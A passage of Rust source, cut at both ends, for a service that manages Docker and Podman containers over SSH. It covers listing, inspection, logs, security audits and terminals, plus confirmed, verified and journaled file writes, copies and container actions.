    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub const fn direction(&self) -> DockerFileCopyDirection {
        self.direction
    }

    pub fn source_path(&self) -> &str {
        self.source.path()
    }

    pub fn target_path(&self) -> &str {
        self.target.path()
    }

    pub fn source_bytes(&self) -> u64 {
        match self.source_revision {
            ContainerFileState::File { bytes, .. } => bytes,
            ContainerFileState::Missing => unreachable!("copy source is always a file"),
        }
    }

    pub fn source_sha256(&self) -> &str {
        match &self.source_revision {
            ContainerFileState::File { sha256, .. } => sha256,
            ContainerFileState::Missing => unreachable!("copy source is always a file"),
        }
    }

    /// The target as it was found when the plan was made, in words.
    pub fn target_before_description(&self) -> String {
        self.target_before.description("目标文件")
    }
}

impl fmt::Debug for DockerFileCopyPlan {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("DockerFileCopyPlan")
            .field("operation", &self.operation)
            .field("container", &self.container)
            .field("direction", &self.direction)
            .field("source", &self.source)
            .field("target", &self.target)
            .field("source_revision", &self.source_revision.summary())
            .field("target_before", &self.target_before.summary())
            .finish_non_exhaustive()
    }
}

#[derive(Debug, Clone)]
pub struct DockerFileCopyOutcome {
    pub operation_id: String,
    pub verified: bool,
    pub verification_detail: String,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ContainerAction {
    Start,
    Stop,
    Restart,
    Pause,
    Unpause,
    Kill,
    Remove,
}

impl ContainerAction {
    pub const ALL: [Self; 7] = [
        Self::Start,
        Self::Stop,
        Self::Restart,
        Self::Pause,
        Self::Unpause,
        Self::Kill,
        Self::Remove,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Start => "启动",
            Self::Stop => "停止",
            Self::Restart => "重启",
            Self::Pause => "暂停",
            Self::Unpause => "恢复运行",
            Self::Kill => "强制终止",
            Self::Remove => "删除",
        }
    }

    pub const fn id(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
            Self::Pause => "pause",
            Self::Unpause => "unpause",
            Self::Kill => "kill",
            Self::Remove => "remove",
        }
    }

    /// UI availability is derived from the same closed state machine used by
    /// the planner. The planner still probes the remote state again before it
    /// mints an immutable operation, so this is never an authorization check.
    pub fn is_available_in_state(self, state: &str) -> bool {
        match self {
            Self::Start => matches!(state, "created" | "exited" | "dead"),
            Self::Stop => matches!(state, "running" | "paused" | "restarting"),
            Self::Restart => matches!(state, "running" | "paused"),
            Self::Pause => state == "running",
            Self::Unpause => state == "paused",
            Self::Kill => matches!(state, "running" | "paused" | "restarting"),
            Self::Remove => matches!(state, "created" | "removing" | "exited" | "dead"),
        }
    }

    const fn verb(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
            Self::Pause => "pause",
            Self::Unpause => "unpause",
            Self::Kill => "kill",
            Self::Remove => "rm",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerActionRequest {
    pub container: ContainerIdentity,
    pub action: ContainerAction,
}

/// Immutable mutation plan. Shell commands deliberately remain private.
#[derive(Debug, Clone)]
pub struct DockerActionPlan {
    operation: OperationPlan,
    container: ContainerIdentity,
    action: ContainerAction,
    before_state: String,
    execute_command: String,
    verify_command: String,
    expected_states: Vec<String>,
    restore_command: Option<String>,
    restore_expected_states: Vec<String>,
}

impl DockerActionPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub const fn action(&self) -> ContainerAction {
        self.action
    }

    pub fn before_state(&self) -> &str {
        &self.before_state
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DockerActionOutcome {
    pub operation_id: String,
    pub verified: bool,
    pub verification_detail: String,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone)]
pub struct DockerService {
    ssh: SshService,
    target: Arc<TargetContext>,
}

impl DockerService {
    pub fn new(ssh: SshService, target: Arc<TargetContext>) -> Self {
        Self { ssh, target }
    }

    /// Which container runtime this host can actually be asked about.
    ///
    /// Assuming Docker is wrong on a large share of real machines: openEuler,
    /// Anolis and RHEL-family hosts ship Podman and often no `docker` at all,
    /// and a page that only ever ran `docker ps` reads as "no containers here"
    /// on every one of them — a false negative, and the worst kind, because it
    /// looks like an answer.
    ///
    /// Installed and usable are reported apart on purpose. A Docker binary
    /// with a stopped daemon is a thing an operator can fix; "this host has no
    /// container runtime" is a thing they should stop looking for.
    pub async fn detect_runtime(
        &self,
        session: &BoundSshSession,
    ) -> CoreResult<ContainerRuntimeProbe> {
        let output = self
            .read_command(
                session,
                RUNTIME_PROBE_COMMAND.to_owned(),
                Duration::from_secs(20),
                "detect container runtime",
            )
            .await?;
        Ok(parse_runtime_probe(&output))
    }

    pub async fn list(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<ContainerSummary>> {
        let command = format!(
            "{} ps -a --no-trunc --format '{{{{json .}}}}'",
            runtime.command()
        );
        let output = self
            .read_command(session, command, Duration::from_secs(20), "list containers")
            .await?;
        parse_container_list(runtime, &output)
    }

    pub async fn stats(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<ContainerStats>> {
        let command = format!(
            "{} stats --no-stream --no-trunc --format '{{{{json .}}}}'",
            runtime.command()
        );
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(25),
                "read container stats",
            )
            .await?;
        parse_container_stats(runtime, &output)
    }

    pub async fn images(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<ContainerImage>> {
        let command = format!(
            "{} image ls --no-trunc --digests --format '{{{{json .}}}}'",
            runtime.command()
        );
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(20),
                "list container images",
            )
            .await?;
        parse_images(runtime, &output)
    }

    /// What an image is made of: how it was configured, and how it was built.
    ///
    /// Two commands rather than one, because they answer different questions
    /// and only the pair is useful. `image inspect` says what the image will
    /// do when it starts — the user it runs as, the entrypoint, the baked-in
    /// environment. `image history` says how it got that way, which is where a
    /// layer someone added shows up. A history that cannot be read does not
    /// fail the inspection: an image pulled by digest has no local history,
    /// and the configuration is still worth showing.
    pub async fn inspect_image(
        &self,
        session: &BoundSshSession,
        image: &ContainerImage,
    ) -> CoreResult<DockerImageInspection> {
        let output = self
            .read_command(
                session,
                image_inspect_command(image)?,
                Duration::from_secs(20),
                "inspect container image",
            )
            .await?;
        let mut inspection = parse_image_inspection(image, &output)?;
        if let Ok(history) = self
            .read_command(
                session,
                image_history_command(image)?,
                Duration::from_secs(20),
                "read container image history",
            )
            .await
        {
            inspection.history = parse_image_history(&history)?;
        }
        Ok(inspection)
    }

    pub async fn networks(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<DockerNetwork>> {
        let output = self
            .read_command(
                session,
                format!(
                    "{} network ls --no-trunc --format '{{{{json .}}}}'",
                    runtime.command()
                ),
                Duration::from_secs(20),
                "list container networks",
            )
            .await?;
        parse_networks(runtime, &output)
    }

    pub async fn volumes(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<DockerVolume>> {
        let output = self
            .read_command(
                session,
                format!("{} volume ls --format '{{{{json .}}}}'", runtime.command()),
                Duration::from_secs(20),
                "list container volumes",
            )
            .await?;
        parse_volumes(runtime, &output)
    }

    pub async fn inspect_network(
        &self,
        session: &BoundSshSession,
        network: &DockerNetwork,
    ) -> CoreResult<DockerNetworkInspection> {
        let output = self
            .read_command(
                session,
                network_inspect_command(network)?,
                Duration::from_secs(20),
                "inspect container network",
            )
            .await?;
        parse_network_inspection(network, &output)
    }

    pub async fn inspect_volume(
        &self,
        session: &BoundSshSession,
        volume: &DockerVolume,
    ) -> CoreResult<DockerVolumeInspection> {
        let output = self
            .read_command(
                session,
                volume_inspect_command(volume)?,
                Duration::from_secs(20),
                "inspect container volume",
            )
            .await?;
        parse_volume_inspection(volume, &output)
    }

    pub async fn compose_projects(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerCollection<DockerComposeProject>> {
        let output = self
            .read_command(
                session,
                format!("{} compose ls --all --format json", runtime.command()),
                Duration::from_secs(20),
                "list compose projects",
            )
            .await?;
        parse_compose_projects(runtime, &output)
    }

    pub async fn inspect(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
    ) -> CoreResult<ContainerInspection> {
        let command = inspect_command(container)?;
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(20),
                "inspect container",
            )
            .await?;
        parse_inspection(container, &output)
    }

    /// Audit every container returned by one closed runtime snapshot. The
    /// runtime must return exactly the requested canonical IDs; missing,
    /// duplicate, or extra inspect records fail the entire audit closed.
    pub async fn security_audit(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<DockerSecurityAudit> {
        let inventory = self.list(session, runtime).await?;
        let identities = inventory
            .items
            .into_iter()
            .map(|container| container.identity)
            .collect::<Vec<_>>();
        if identities.is_empty() {
            return Ok(build_security_audit(
                runtime,
                Vec::new(),
                inventory.truncated,
            ));
        }
        let command = security_audit_command(runtime, &identities)?;
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(45),
                "inspect containers for security audit",
            )
            .await?;
        let inspected = parse_security_inspections(runtime, &identities, &output)?;
        Ok(build_security_audit(
            runtime,
            inspected,
            inventory.truncated,
        ))
    }

    pub async fn logs(
        &self,
        session: &BoundSshSession,
        request: &ContainerLogsRequest,
    ) -> CoreResult<ContainerLogs> {
        validate_logs_request(request)?;
        let command = logs_command(request);
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(30),
                "read container logs",
            )
            .await?;
        let (text, truncated) = sanitize_multiline(&output, MAX_LOG_CHARS);
        Ok(ContainerLogs {
            identity: request.container.clone(),
            text,
            truncated,
        })
    }

    /// What the container's filesystem changed relative to its image:
    /// `docker diff`. Files added under /tmp, a changed binary, a deleted
    /// log — the first question about a container that may have been entered.
    /// Works on a stopped container too; the runtime keeps the layer.
    pub async fn changes(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
    ) -> CoreResult<ContainerChanges> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        let output = self
            .read_command(
                session,
                // stderr is appended to the output by the transport, and
                // Podman writes warnings there (cgroups v1) that would read
                // as one more line; a real failure still fails on the exit.
                format!(
                    "{} diff -- {} 2>/dev/null",
                    container.runtime.command(),
                    shq(container.id())
                ),
                Duration::from_secs(60),
                "read container filesystem changes",
            )
            .await?;
        self.target.validate(session.target())?;
        Ok(parse_container_changes(container, &output))
    }

    /// The processes running in the container, as the runtime's `top` sees
    /// them from the host. Read from outside, so it works in an image with no
    /// `ps` and cannot be fooled by a `ps` replaced inside the container.
    pub async fn processes(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
    ) -> CoreResult<ContainerProcesses> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        let output = self
            .read_command(
                session,
                // As for diff: a warning after the table would parse as a process.
                format!(
                    "{} top {} 2>/dev/null",
                    container.runtime.command(),
                    shq(container.id())
                ),
                Duration::from_secs(30),
                "read container processes",
            )
            .await?;
        self.target.validate(session.target())?;
        parse_container_processes(container, &output)
    }

    /// One directory inside a running container, for browsing to a file.
    ///
    /// Read-only and bounded: the listing runs the fixed script in
    /// `exec_directory` through the runtime's exec, and names come back as
    /// data. Opening an entry goes through `read_file` like a typed path.
    pub async fn list_directory(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        directory: &RemotePath,
    ) -> CoreResult<crate::exec_directory::ExecDirectoryListing> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        let exec = format!(
            "{} exec -- {}",
            container.runtime.command(),
            shq(container.id())
        );
        let output = self
            .read_command(
                session,
                crate::exec_directory::listing_command(&exec, directory),
                Duration::from_secs(30),
                "list container directory",
            )
            .await?;
        self.target.validate(session.target())?;
        crate::exec_directory::parse_listing(directory.clone(), &output)
    }

    /// Read a regular UTF-8 container file as an exact bounded snapshot.
    ///
    /// The remote identity is probed before and after the read. The returned
    /// bytes must match the observed SHA-256 and length, so command warnings,
    /// lossy decoding, concurrent writers, symlinks and oversized files all
    /// fail closed instead of reaching the editor.
    pub async fn read_file(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        path: &ContainerFilePath,
    ) -> CoreResult<DockerFileContent> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        let before = self.probe_file_bound(session, container, path).await?;
        let (expected_sha256, expected_bytes) = match &before {
            ContainerFileState::Missing => {
                return Err(CoreError::validation(
                    "container file read",
                    "file does not exist",
                ));
            }
            ContainerFileState::File { sha256, bytes } => (sha256.as_str(), *bytes),
        };
        if expected_bytes > MAX_CONTAINER_FILE_BYTES as u64 {
            return Err(CoreError::validation(
                "container file read",
                format!("file must be at most {MAX_CONTAINER_FILE_BYTES} bytes"),
            ));
        }

        let content = self.read_file_bound(session, container, path).await?;
        self.target.validate(session.target())?;
        if content.len() as u64 != expected_bytes
            || sha256_hex(content.as_bytes()) != expected_sha256
        {
            return Err(CoreError::validation(
                "container file read",
                "downloaded text does not match the remote length and SHA-256 marker",
            ));
        }
        let after = self.probe_file_bound(session, container, path).await?;
        self.target.validate(session.target())?;
        if after != before {
            return Err(CoreError::validation(
                "container file read",
                format!(
                    "file changed during read from {} to {}",
                    before.summary(),
                    after.summary()
                ),
            ));
        }
        Ok(DockerFileContent {
            container: container.clone(),
            path: path.clone(),
            content: Arc::from(content),
            revision: before,
        })
    }

    /// Observe the current file identity before minting a dangerous immutable
    /// write plan. The content is retained only inside the typed plan and never
    /// enters Debug output, operation metadata, or the journal.
    pub async fn plan_file_write(
        &self,
        session: &BoundSshSession,
        request: DockerFileWriteRequest,
    ) -> CoreResult<DockerFileWritePlan> {
        self.target.validate(session.target())?;
        validate_container_id(request.container.id())?;
        if request.content.len() > MAX_CONTAINER_FILE_BYTES {
            return Err(CoreError::validation(
                "container file content",
                format!("must be at most {MAX_CONTAINER_FILE_BYTES} bytes"),
            ));
        }
        let before = self
            .probe_file(session, &request.container, &request.path)
            .await?;
        if let Some(expected) = request.expected_before.as_ref()
            && expected != &before
        {
            return Err(CoreError::validation(
                "Docker file write precondition",
                format!(
                    "loaded file changed from {} to {}; reload before saving",
                    expected.summary(),
                    before.summary()
                ),
            ));
        }
        self.target.validate(session.target())?;
        build_file_write_plan(session.target().clone(), request, before)
    }

    /// Execute the confirmed write, journal it, verify exact content, and
    /// automatically restore the observed pre-write state on verification
    /// failure. There is intentionally no public raw file-write method.
    pub async fn execute_file_write(
        &self,
        session: &BoundSshSession,
        plan: DockerFileWritePlan,
        confirmation: DangerousConfirmation,
        journal: &PortableOperationJournal,
    ) -> CoreResult<DockerFileWriteOutcome> {
        self.target.validate(session.target())?;
        if plan.operation.target != *session.target() {
            return Err(CoreError::validation(
                "Docker file write target",
                "plan is not bound to this SSH target epoch",
            ));
        }
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        let executor = DockerFileWriteExecutor {
            service: self,
            session,
            plan: &plan,
        };
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "Docker file verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
        };
        if !verification.passed {
            operation.restore(&self.target, &executor, journal).await?;
            return Ok(DockerFileWriteOutcome {
                operation_id: plan.operation.id,
                verified: false,
                verification_detail: verification.detail,
                restored_after_failed_verification: true,
                restore_receipt: None,
            });
        }
        let restore_receipt = DockerFileRestoreReceipt {
            target: plan.operation.target.clone(),
            container: plan.container.clone(),
            path: plan.path.clone(),
            backup_path: matches!(plan.before, ContainerFileState::File { .. })
                .then(|| plan.backup_path.clone()),
            before: plan.before.clone(),
            written_sha256: plan.content_sha256.clone(),
            written_bytes: plan.content.len() as u64,
        };
        Ok(DockerFileWriteOutcome {
            operation_id: plan.operation.id,
            verified: true,
            verification_detail: verification.detail,
            restored_after_failed_verification: false,
            restore_receipt: Some(restore_receipt),
        })
    }

    /// Probe both endpoints and mint an immutable binary file-copy plan. The
    /// request variants make host/container direction explicit and prevent a
    /// UI string from becoming a command fragment.
    pub async fn plan_file_copy(
        &self,
        session: &BoundSshSession,
        request: DockerFileCopyRequest,
    ) -> CoreResult<DockerFileCopyPlan> {
        self.target.validate(session.target())?;
        validate_container_id(request.container().id())?;
        let (container, direction, source, target) = copy_request_endpoints(request)?;
        if source == target {
            return Err(CoreError::validation(
                "Docker file copy",
                "source and target must be different",
            ));
        }
        let source_revision = self
            .probe_copy_endpoint_bound(session, &container, &source)
            .await?;
        let source_bytes = match &source_revision {
            ContainerFileState::Missing => {
                return Err(CoreError::validation(
                    "Docker file copy source",
                    "source file does not exist",
                ));
            }
            ContainerFileState::File { bytes, .. } => *bytes,
        };
        if source_bytes > MAX_DOCKER_FILE_COPY_BYTES {
            return Err(CoreError::validation(
                "Docker file copy source",
                format!("must be at most {MAX_DOCKER_FILE_COPY_BYTES} bytes"),
            ));
        }
        let target_before = self
            .probe_copy_endpoint_bound(session, &container, &target)
            .await?;
        if matches!(
            &target_before,
            ContainerFileState::File { bytes, .. } if *bytes > MAX_DOCKER_FILE_COPY_BYTES
        ) {
            return Err(CoreError::validation(
                "Docker file copy target",
                format!("existing target must be at most {MAX_DOCKER_FILE_COPY_BYTES} bytes"),
            ));
        }
        self.target.validate(session.target())?;
        build_file_copy_plan(
            session.target().clone(),
            container,
            direction,
            source,
            target,
            source_revision,
            target_before,
        )
    }

    /// Execute a confirmed copy and verify the exact source revision at the
    /// destination. A verification failure restores only when the destination
    /// is still either the captured pre-state or the exact bytes written by
    /// this plan; an unrelated concurrent value is never overwritten.
    pub async fn execute_file_copy(
        &self,
        session: &BoundSshSession,
        plan: DockerFileCopyPlan,
        confirmation: DangerousConfirmation,
        journal: &PortableOperationJournal,
    ) -> CoreResult<DockerFileCopyOutcome> {
        self.target.validate(session.target())?;
        if plan.operation.target != *session.target() {
            return Err(CoreError::validation(
                "Docker file copy target",
                "plan is not bound to this SSH target epoch",
            ));
        }
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        let executor = DockerFileCopyExecutor {
            service: self,
            session,
            plan: &plan,
        };
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "Docker file copy verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
        };
        if !verification.passed {
            operation.restore(&self.target, &executor, journal).await?;
            return Ok(DockerFileCopyOutcome {
                operation_id: plan.operation.id,
                verified: false,
                verification_detail: verification.detail,
                restored_after_failed_verification: true,
            });
        }
        Ok(DockerFileCopyOutcome {
            operation_id: plan.operation.id,
            verified: true,
            verification_detail: verification.detail,
            restored_after_failed_verification: false,
        })
    }

    /// Pick the best shell that actually exists inside a container.
    ///
    /// Asking for `bash` everywhere fails on the many images that only ship
    /// busybox, and always asking for `sh` gives up line editing and history on
    /// the images that do have bash. Neither guess is right often enough to
    /// make the operator carry it, so the probe answers it once per session.
    ///
    /// A container with no shell at all — `scratch`, distroless — is a real
    /// answer, not a failure to detect: say so plainly instead of opening a
    /// terminal that dies on the first keystroke.
    pub async fn detect_shell(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
    ) -> CoreResult<ContainerShell> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        // State first, because the probe cannot tell the two apart. Exec into a
        // stopped container produces no output, which is indistinguishable
        // from an image with no shell — and answering "这个容器里没有可用的
        // shell" for a container that is merely stopped sends the operator off
        // to rebuild an image when all they had to do was start it.
        let state = self.probe_state(session, container).await?;
        if state != "running" {
            return Err(CoreError::validation(
                "container terminal",
                format!("container must be running; current state is {state}"),
            ));
        }
        // Run through `sh -c` rather than testing each program with its own
        // exec: three round trips over SSH to learn one word is three times the
        // latency for no more information.
        let command = format!(
            "{} exec -- {} /bin/sh -c {} 2>/dev/null",
            container.runtime.command(),
            shq(container.id()),
            shq(SHELL_PROBE_SCRIPT),
        );
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(15),
                "detect container shell",
            )
            .await?;
        self.target.validate(session.target())?;
        parse_shell_probe(&output)
    }

    /// Open a target-bound interactive PTY in a running container.
    ///
    /// The caller can select only a validated runtime/container identity and a
    /// fixed shell enum. The crate-private SSH actor never exposes an arbitrary
    /// exec command surface.
    pub async fn open_terminal(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        shell: ContainerShell,
        terminal_id: String,
        columns: u16,
        rows: u16,
    ) -> CoreResult<ContainerTerminalSession> {
        self.target.validate(session.target())?;
        validate_container_id(container.id())?;
        let state = self.probe_state(session, container).await?;
        if state != "running" {
            return Err(CoreError::validation(
                "container terminal",
                format!("container must be running; current state is {state}"),
            ));
        }
        self.target.validate(session.target())?;
        let runtime = match container.runtime() {
            ContainerRuntime::Docker => ContainerPtyRuntime::Docker,
            ContainerRuntime::Podman => ContainerPtyRuntime::Podman,
        };
        let marker = uuid::Uuid::new_v4().simple().to_string();
        let cleanup =
            crate::ssh::container_session_cleanup_command(runtime, container.id(), &marker)?;
        // The id comes from the caller and is not minted here. Every event
        // this session emits carries it, and the caller matches events against
        // the id it is holding — one invented in here would fail that check on
        // the first byte of output, which is a mismatch no amount of unit
        // testing on either side would show.
        let inner = self
            .ssh
            .open_container_terminal_bound(
                session,
                ContainerPtyRequest::new(
                    terminal_id,
                    runtime,
                    container.id().to_owned(),
                    shell.pty_shell(),
                    (columns, rows),
                    marker,
                ),
            )
            .await?;
        let terminal = ContainerTerminalSession {
            container: container.clone(),
            shell,
            guard: session.target().clone(),
            target: self.target.clone(),
            inner,
            ssh: self.ssh.clone(),
            session: session.clone(),
            cleanup,
        };
        if let Err(error) = self.target.validate(session.target()) {
            let _ = TerminalTransport::close(&terminal).await;
            return Err(error);
        }
        Ok(terminal)
    }

    /// Snapshot the exact removable resource set before presenting a
    /// dangerous confirmation. Prune requests are expanded into explicit
    /// identities; the executor never invokes the runtime's global prune.
    pub async fn plan_resource_mutation(
        &self,
        session: &BoundSshSession,
        request: DockerResourceMutationRequest,
    ) -> CoreResult<DockerResourceMutationPlan> {
        self.target.validate(session.target())?;
        let (kind, runtime, network_snapshots, volume_snapshots) = match request {
            DockerResourceMutationRequest::RemoveNetwork { network } => {
                let inspection = self.inspect_network(session, &network).await?;
                ensure_network_removable(&inspection)?;
                (
                    DockerResourceMutationKind::RemoveNetwork,
                    network.runtime,
                    vec![inspection],
                    Vec::new(),
                )
            }
            DockerResourceMutationRequest::PruneNetworks { runtime } => {
                let inventory = self.networks(session, runtime).await?;
                if inventory.truncated {
                    return Err(CoreError::validation(
                        "Docker network prune",
                        "network inventory was truncated; refusing to mint an incomplete prune plan",
                    ));
                }
                let mut snapshots = Vec::new();
                for network in inventory.items {
                    if is_protected_network_name(&network.name) {
                        continue;
                    }
                    let inspection = self.inspect_network(session, &network).await?;
                    if !inspection.ingress && inspection.attachments.is_empty() {
                        snapshots.push(inspection);
                    }
                }
                (
                    DockerResourceMutationKind::PruneNetworks,
                    runtime,
                    snapshots,
                    Vec::new(),
                )
            }
            DockerResourceMutationRequest::RemoveVolume { volume } => {
                let inspection = self.inspect_volume(session, &volume).await?;
                let used = self
                    .used_volume_mountpoints(session, volume.runtime)
                    .await?;
                ensure_volume_removable(&inspection, &used)?;
                (
                    DockerResourceMutationKind::RemoveVolume,
                    volume.runtime,
                    Vec::new(),
                    vec![inspection],
                )
            }
            DockerResourceMutationRequest::PruneVolumes { runtime } => {
                let inventory = self.volumes(session, runtime).await?;
                if inventory.truncated {
                    return Err(CoreError::validation(
                        "Docker volume prune",
                        "volume inventory was truncated; refusing to mint an incomplete prune plan",
                    ));
                }
                let used = self.used_volume_mountpoints(session, runtime).await?;
                let mut snapshots = Vec::new();
                for volume in inventory.items {
                    let inspection = self.inspect_volume(session, &volume).await?;
                    if ensure_volume_removable(&inspection, &used).is_ok() {
                        snapshots.push(inspection);
                    }
                }
                (
                    DockerResourceMutationKind::PruneVolumes,
                    runtime,
                    Vec::new(),
                    snapshots,
                )
            }
        };
        self.target.validate(session.target())?;
        build_resource_mutation_plan(
            session.target().clone(),
            kind,
            runtime,
            network_snapshots,
            volume_snapshots,
        )
    }

    pub async fn execute_resource_mutation(
        &self,
        session: &BoundSshSession,
        plan: DockerResourceMutationPlan,
        confirmation: DangerousConfirmation,
        journal: &PortableOperationJournal,
    ) -> CoreResult<DockerResourceMutationOutcome> {
        self.target.validate(session.target())?;
        if plan.operation.target != *session.target() {
            return Err(CoreError::validation(
                "Docker resource operation target",
                "plan is not bound to this SSH target epoch",
            ));
        }
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        let executor = DockerResourceMutationExecutor {
            service: self,
            session,
            plan: &plan,
        };
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(DockerResourceMutationOutcome {
            operation_id: plan.operation.id,
            kind: plan.kind,
            affected: plan.targets.len(),
            verified: verification.passed,
            verification_detail: verification.detail,
        })
    }

    pub async fn plan_compose_action(
        &self,
        session: &BoundSshSession,
        request: DockerComposeActionRequest,
    ) -> CoreResult<DockerComposeActionPlan> {
        validate_compose_project_name(&request.project.name)?;
        if !request.action.is_available(&request.project) {
            return Err(CoreError::validation(
                "Docker Compose action",
                format!(
                    "project {} is not in a state that permits {}",
                    request.project.name,
                    request.action.label()
                ),
            ));
        }
        let config_files = parse_compose_config_files(&request.project.config_files)?;
        let current = self
            .compose_projects(session, request.project.runtime)
            .await?
            .items
            .into_iter()
            .find(|project| project.name == request.project.name)
            .ok_or_else(|| {
                CoreError::validation(
                    "Docker Compose action",
                    "project is no longer present in the runtime inventory",
                )
            })?;
        if current != request.project
            || parse_compose_config_files(&current.config_files)? != config_files
        {
            return Err(CoreError::validation(
                "Docker Compose action",
                "project snapshot changed; refresh before creating a new plan",
            ));
        }
        self.target.validate(session.target())?;
        build_compose_action_plan(session.target().clone(), request, config_files)
    }

    pub async fn execute_compose_action(
        &self,
        session: &BoundSshSession,
        plan: DockerComposeActionPlan,
        confirmation: DangerousConfirmation,
        journal: &PortableOperationJournal,
    ) -> CoreResult<DockerComposeActionOutcome> {
        self.target.validate(session.target())?;
        if plan.operation.target != *session.target() {
            return Err(CoreError::validation(
                "Docker Compose operation target",
                "plan is not bound to this SSH target epoch",
            ));
        }
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        let executor = DockerComposeActionExecutor {
            service: self,
            session,
            plan: &plan,
        };
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(DockerComposeActionOutcome {
            operation_id: plan.operation.id,
            action: plan.action,
            verified: verification.passed,
            verification_detail: verification.detail,
        })
    }

    /// Observe current state before minting an immutable destructive plan.
    pub async fn plan_action(
        &self,
        session: &BoundSshSession,
        request: &ContainerActionRequest,
    ) -> CoreResult<DockerActionPlan> {
        let before_state = self.probe_state(session, &request.container).await?;
        build_action_plan(session.target().clone(), request, &before_state)
    }

    /// Execute the complete destructive workflow. There is intentionally no
    /// public raw mutation method.
    pub async fn execute_action(
        &self,
        session: &BoundSshSession,
        action: DockerActionPlan,
        confirmation: DangerousConfirmation,
        journal: &PortableOperationJournal,
    ) -> CoreResult<DockerActionOutcome> {
        self.target.validate(session.target())?;
        if action.operation.target != *session.target() {
            return Err(CoreError::validation(
                "Docker operation target",
                "plan is not bound to this SSH target epoch",
            ));
        }
        let mut operation = PlannedOperation::plan(action.operation.clone());
        operation.confirm(confirmation)?;
        let executor = DockerActionExecutor {
            service: self,
            session,
            action: &action,
        };
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        let mut restored = false;
        if !verification.passed && action.restore_command.is_some() {
            operation.restore(&self.target, &executor, journal).await?;
            restored = true;
        }
        Ok(DockerActionOutcome {
            operation_id: action.operation.id,
            verified: verification.passed,
            verification_detail: verification.detail,
            restored_after_failed_verification: restored,
        })
    }

    async fn used_volume_mountpoints(
        &self,
        session: &BoundSshSession,
        runtime: ContainerRuntime,
    ) -> CoreResult<BTreeSet<String>> {
        let inventory = self.list(session, runtime).await?;
        if inventory.truncated {
            return Err(CoreError::validation(
